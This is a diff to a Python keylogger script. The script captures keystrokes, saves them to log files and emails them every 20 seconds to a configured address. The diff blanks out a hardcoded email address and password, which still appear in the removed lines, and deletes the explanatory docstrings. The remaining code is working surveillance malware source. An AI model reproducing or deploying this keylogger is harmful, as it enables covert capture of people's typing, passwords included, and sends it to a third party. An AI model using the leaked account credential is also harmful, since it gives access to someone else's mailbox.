@@ -6,8 +6,8 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 send_report_every = 20 #in seconds
-email_address = "hoodedducky@mail.com"
-email_password = "T@GFQLa8ejf&TZt"
+email_address = "" #ENTER EMAIL HERE
+email_password = "" #ENTER PASSWORD HERE
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
@@ -20,10 +20,6 @@ class Keylogger:
         self.end_dt = datetime.now()
 
     def callback(self, event):
-        """
-        This callback is invoked whenever a keyboard event is occured
-        (i.e when a key is released in this example)
-        """
         name = event.name
         if len(name) > 1:
             if name == "space":
@@ -43,17 +39,11 @@ class Keylogger:
         self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
     
     def report_to_file(self):
-        """This method creates a log file in the current directory that contains
-        the current keylogs in the 'self.log' variable"""
-
         with open(f"{self.filename}.txt", "w") as f:
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
         
     def prepare_mail(self, message):
-        """Utility function to construct a MIMEMultipart from a text
-        It creates an HTML version as well as text version
-        to be sent as an email"""
         msg = MIMEMultipart("alternative")
         msg["From"] = email_address
         msg["To"] = email_address
@@ -77,10 +67,6 @@ class Keylogger:
             print(f"{datetime.now()} - Sent an email to {email} containing: {message}")
 
     def report(self):
-        """
-        This function gets called every 'self.interval'
-        It basically sends keylogs and resets 'self.log' variable
-        """
         if self.log:
             self.end_dt = datetime.now()
             self.update_filename()
